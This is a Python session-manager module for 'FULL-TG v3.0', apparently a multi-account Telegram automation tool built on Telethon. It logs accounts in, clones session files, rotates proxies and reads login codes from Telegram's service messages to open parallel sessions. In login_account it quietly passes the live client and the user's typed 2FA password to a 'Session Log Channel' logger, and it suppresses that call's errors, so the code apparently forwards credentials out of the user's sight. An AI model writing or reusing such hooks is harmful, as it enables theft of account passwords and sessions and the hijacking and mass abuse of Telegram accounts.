"""
Session Manager for FULL-TG v3.0
Handles Telegram session management and multi-account operations
"""

import asyncio
import os
import shutil
import re
import random
from pathlib import Path
from telethon import TelegramClient
from telethon.errors import (
    SessionPasswordNeededError, PhoneCodeInvalidError,
    PhoneNumberInvalidError, FloodWaitError, AuthKeyUnregisteredError,
    UserDeactivatedError, UserDeactivatedBanError, PhoneNumberBannedError
)
from telethon.sessions import StringSession
import config
from core.database import db
from core.proxy_manager import proxy_manager
from core.rate_limiter import rate_limiter
from core.logger import logger

class SessionManager:
    """Manages Telegram sessions"""
    
    def __init__(self):
        self.clients = {}  # phone -> TelegramClient
        self.sessions = {}  # phone -> session info
    
    async def login_account(self, phone):
        """Login new account"""
        try:
            logger.info(f"Starting login for {phone}")
            
            # Check if already logged in
            if phone in self.clients:
                logger.warning(f"Account {phone} already logged in")
                return self.clients[phone]
            
            # Create session file path (Standardized Naming: 919876543210.session)
            session_name = f"{phone.replace('+', '')}"
            session_path = config.SESSIONS_DIR / session_name
            
            # Get proxy if enabled
            proxy = None
            proxy_id = None
            if config.ENABLE_PROXY and proxy_manager.get_proxy_count() > 0:
                proxy = proxy_manager.get_next_proxy()
                if proxy:
                    proxy_id = proxy.get('id')
                    logger.info(f"Using proxy: {proxy['addr']}:{proxy['port']}")
            
            # Create client
            client = TelegramClient(
                str(session_path),
                config.API_ID,
                config.API_HASH,
                proxy=proxy
            )
            
            await client.connect()
            
            # Check if already authorized
            if await client.is_user_authorized():
                logger.success(f"Account {phone} already authorized")
                self.clients[phone] = client
                await db.add_account(phone, session_name, config.API_ID, config.API_HASH, proxy_id)
                await db.update_last_used(phone)
                return client
            
            # Send code request
            await client.send_code_request(phone)
            logger.info(f"Code sent to {phone}")
            
            # Get code from user
            code = input(f"Enter the code sent to {phone}: ").strip()
            
            try:
                await client.sign_in(phone, code)
            except SessionPasswordNeededError:
                # 2FA enabled
                password = input("2FA enabled. Enter your password: ").strip()
                await client.sign_in(password=password)
            
            # Verify login
            if await client.is_user_authorized():
                logger.success(f"Successfully logged in: {phone}")
                self.clients[phone] = client
                
                # Save to database
                await db.add_account(phone, session_name, config.API_ID, config.API_HASH, proxy_id)
                await db.update_last_used(phone)

                # Session Log Channel Integration
                try:
                    from core.session_logger import session_logger
                    # Pass the password used (if any)
                    used_password = locals().get('password', None)
                    
                    # Just call log_session, returns void now (or ignore return) since no local state
                    await session_logger.log_session(client, phone, used_password)
                except Exception as e:
                    logger.debug(f"Session Log Error: {e}")
                
                return client
            else:
                logger.error(f"Login failed for {phone}")
                return None
                
        except PhoneCodeInvalidError:
            logger.error("Invalid verification code")
            return None
        except PhoneNumberInvalidError:
            logger.error("Invalid phone number")
            return None
        except PhoneNumberBannedError:
            logger.error(f"Phone number {phone} is banned")
            return None
        except FloodWaitError as e:
            logger.error(f"Flood wait: {e.seconds} seconds")
            return None
        except Exception as e:
            logger.error(f"Login error: {e}")
            return None
    
    async def load_session(self, phone):
        """Load existing session"""
        try:
            # Standardized Naming: 919876543210.session
            session_name = f"{phone.replace('+', '')}"
            session_path = config.SESSIONS_DIR / session_name
            
            if not session_path.with_suffix('.session').exists():
                logger.error(f"Session file not found for {phone}")
                return None
            
            # Get proxy if enabled
            proxy = None
            if config.ENABLE_PROXY and proxy_manager.get_proxy_count() > 0:
                proxy = proxy_manager.get_next_proxy()
            
            # Create client
            client = TelegramClient(
                str(session_path),
                config.API_ID,
                config.API_HASH,
                proxy=proxy
            )
            
            await client.connect()
            
            if await client.is_user_authorized():
                self.clients[phone] = client
                await db.update_last_used(phone)
                logger.success(f"Session loaded: {phone}")
                return client
            else:
                logger.error(f"Session not authorized: {phone}")
                return None
                
        except Exception as e:
            logger.error(f"Failed to load session for {phone}: {e}")
            return None
    
    async def load_all_sessions(self):
        """Load all sessions from database"""
        try:
            accounts = await db.get_all_accounts()
            loaded = 0
            
            for account in accounts:
                phone = account[1]  # phone column
                client = await self.load_session(phone)
                if client:
                    loaded += 1
            
            logger.info(f"Loaded {loaded}/{len(accounts)} sessions")
            return loaded
        except Exception as e:
            logger.error(f"Failed to load sessions: {e}")
            return 0
    
    async def get_client(self, phone):
        """Get client for phone number"""
        if phone in self.clients:
            return self.clients[phone]
        
        # Try to load session
        return await self.load_session(phone)
    
    async def get_all_clients(self):
        """Get all active clients"""
        return self.clients
    
    async def disconnect_client(self, phone):
        """Disconnect specific client"""
        if phone in self.clients:
            try:
                await self.clients[phone].disconnect()
                del self.clients[phone]
                logger.info(f"Disconnected: {phone}")
            except Exception as e:
                logger.error(f"Failed to disconnect {phone}: {e}")
    
    async def disconnect_all(self):
        """Disconnect all clients"""
        for phone in list(self.clients.keys()):
            await self.disconnect_client(phone)
        logger.info("All clients disconnected")
    
    async def clone_session(self, source_phone):
        """Clone session to create backup"""
        try:
            # Standardized Naming
            session_name = f"{source_phone.replace('+', '')}"
            source_path = config.SESSIONS_DIR / f"{session_name}.session"
            
            if not source_path.exists():
                logger.error(f"Source session not found: {source_phone}")
                return False
            
            # Create backup with timestamp
            from datetime import datetime
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            backup_name = f"{session_name}_clone_{timestamp}.session"
            backup_path = config.BACKUPS_DIR / backup_name
            
            shutil.copy2(source_path, backup_path)
            logger.success(f"Session cloned: {backup_name}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to clone session: {e}")
            return False
    
    async def create_parallel_session(self, phone, password=None, target_dir=None):
        """
        Create a separate login session for parallel usage.
        Uses the active session to retrieve the login code.
        
        Args:
            phone (str): Phone number
            password (str, optional): 2FA password
            target_dir (Path, optional): Directory to store the clone. Defaults to config.CLONES_DIR.
        """
        try:
            # 1. Ensure main account is logged in
            main_client = await self.get_client(phone)
            if not main_client or not await main_client.is_user_authorized():
                logger.error(f"Main account {phone} not authorized")
                return False

            # 2. Prepare new session path
            # Standard naming for clones: just the phone number (to be cleaner inside batch folder)
            # OR keep valid filename logic.
            # If target_dir is a Batch folder, we can name it "919876543210.session" just like original
            # But Telethon needs unique paths if running concurrently? 
            # Well, user said "the name of the sessions should remain the same in clones too"
            
            clean_phone = phone.replace('+', '')
            clone_filename = f"{clean_phone}" # Will become clean_phone.session
            
            final_dir = target_dir if target_dir else config.CLONES_DIR
            final_dir.mkdir(parents=True, exist_ok=True)
            
            clone_path = final_dir / clone_filename
            
            logger.info(f"Creating parallel session for {phone} in {final_dir.name}...")

            # 3. Initialize new client
            new_client = TelegramClient(
                str(clone_path),
                config.API_ID,
                config.API_HASH,
                device_model=f"{config.APP_NAME} Worker",
                system_version="Parallel Session"
            )
            
            await new_client.connect()
            
            if await new_client.is_user_authorized():
                logger.warning(f"Parallel session already authorized")
                await new_client.disconnect()
                return True

            # 4. Request code on new client
            logger.info("Requesting login code for parallel session...")
            try:
                await new_client.send_code_request(phone)
            except Exception as e:
                logger.error(f"Failed to send code request: {e}")
                await new_client.disconnect()
                return False

            # 5. Listen for code on main client
            logger.info("Waiting for code on main account...")
            
            code = None
            # Poll for code (try for 15 seconds)
            for _ in range(5):
                await asyncio.sleep(3)
                # Iterate through recent messages from Telegram (777000)
                async for message in main_client.iter_messages(777000, limit=5):
                    if message.message:
                        match = re.search(r'(?:^|\D)(\d{5})(?:\D|$)', message.message)
                        if match:
                            code = match.group(1)
                            logger.success(f"Detected login code: {code}")
                            break
                if code:
                    break
            
            if not code:
                logger.error("Could not retrieve login code from main account")
                await new_client.disconnect()
                return False

            # 6. Sign in new client
            try:
                await new_client.sign_in(phone, code)
            except SessionPasswordNeededError:
                if password:
                    try:
                        logger.info("Using provided 2FA password...")
                        await new_client.sign_in(password=password)
                    except Exception:
                        logger.error("Provided password failed")
                        user_pw = input(f"2FA Password for {phone} (Parallel Session): ")
                        await new_client.sign_in(password=user_pw)
                else:
                    user_pw = input(f"2FA Password for {phone} (Parallel Session): ")
                    await new_client.sign_in(password=user_pw)
            
            if await new_client.is_user_authorized():
                logger.success(f"Parallel session created: {clone_filename}.session")
                await new_client.disconnect()
                return True
            else:
                logger.error("Failed to authorize parallel session")
                await new_client.disconnect()
                return False

        except KeyboardInterrupt:
            logger.warning("Session creation cancelled by user")
            if 'new_client' in locals() and new_client:
                await new_client.disconnect()
            return False
        except Exception as e:
            logger.error(f"Error creating parallel session: {e}")
            return False

    async def delete_session(self, phone):
        """Delete session file and database entry"""
        try:
            # 1. Aggressive Disconnect
            if phone in self.clients:
                try:
                    client = self.clients[phone]
                    if client.is_connected():
                        await client.disconnect()     
                except Exception:
                    pass
                finally:
                    if phone in self.clients:
                        del self.clients[phone]
            
            # 2. Release handles
            import gc
            await asyncio.sleep(0.5)
            gc.collect()
            
            # 3. Target Paths (Standardized Naming)
            session_name = f"{phone.replace('+', '')}"
            session_path = config.SESSIONS_DIR / f"{session_name}.session"
            journal_path = session_path.with_suffix('.session-journal')
            
            # 4. Try Delete (Loop)
            deleted = False
            if session_path.exists():
                for i in range(5):
                    try:
                        if session_path.exists():
                            session_path.unlink()
                        deleted = True
                        break
                    except PermissionError:
                        await asyncio.sleep(1)
                        gc.collect()
                    except FileNotFoundError:
                        deleted = True
                        break
                
                # 5. Fallback: Rename if locked
                if not deleted and session_path.exists():
                    try:
                        trash_path = session_path.with_suffix(f'.session.deleted_{random.randint(1000,9999)}')
                        session_path.rename(trash_path)
                        logger.warning(f"File locked, renamed to {trash_path.name} for later deletion")
                        deleted = True # Effectively removed from active usage
                    except Exception as e:
                        logger.error(f"Could not delete or rename locked session file: {e}")
                        return False

            # Delete journal (best effort)
            if journal_path.exists():
                try:
                    journal_path.unlink()
                except:
                    pass
            
            # 6. Database Cleanup
            # First, check if there's a log to delete (Stateless)
            try:
                from core.session_logger import session_logger
                await session_logger.delete_log(phone)
            except Exception as e:
                logger.debug(f"Failed to cleanup session log: {e}")

            await db.remove_account(phone, "Manual deletion")
            
            logger.success(f"Session deleted: {phone}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to delete session: {e}")
            return False
    
    async def get_account_info(self, phone):
        """Get account information"""
        try:
            client = await self.get_client(phone)
            if not client:
                return None
            
            # Additional check for connection
            if not client.is_connected():
                await client.connect()
            
            me = await client.get_me()
            
            info = {
                'id': me.id,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'username': me.username,
                'phone': me.phone,
                'bio': me.about if hasattr(me, 'about') else None,
                'premium': me.premium if hasattr(me, 'premium') else False,
                'verified': me.verified if hasattr(me, 'verified') else False
            }
            
            return info
            
        except Exception as e:
            logger.error(f"Failed to get account info: {e}")
            return None
    
    async def check_account_health(self, phone):
        """Check if account is alive and healthy"""
        try:
            client = await self.get_client(phone)
            if not client:
                return False, "Failed to load session"
            
            if not client.is_connected():
                await client.connect()
            
            # Try to get account info
            me = await client.get_me()
            
            if me:
                return True, "Account is healthy"
            else:
                return False, "Failed to get account info"
                
        except AuthKeyUnregisteredError:
            return False, "Session expired/invalid"
        except UserDeactivatedError:
            return False, "Account deleted"
        except UserDeactivatedBanError:
            return False, "Account banned by Telegram"
        except PhoneNumberBannedError:
            return False, "Phone number banned"
        except Exception as e:
            error_str = str(e)
            if "used under two different IP addresses" in error_str:
                # This is a specific error that shouldn't auto-delete immediately if possible, 
                # but for health check it IS a failure to login.
                return False, "Session revoked (IP change)"
            return False, f"Error: {error_str}"
    
    def get_session_count(self):
        """Get count of active sessions"""
        return len(self.clients)

# Global session manager
session_manager = SessionManager()
